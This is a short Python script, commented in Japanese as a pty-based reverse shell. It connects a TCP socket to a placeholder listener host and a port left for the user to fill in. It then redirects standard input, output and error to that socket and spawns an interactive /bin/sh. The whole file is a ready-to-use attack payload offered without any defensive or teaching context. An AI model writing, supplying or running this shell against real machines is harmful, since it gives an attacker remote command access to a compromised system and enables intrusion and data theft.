"""
ptyを使用したrevシェル
"""

from ast import Num
import socket,subprocess,os 
import pty

lhost = "lhost"
lport = int("ポート番号を入力")

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((lhost,lport))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

pty.spawn("/bin/sh")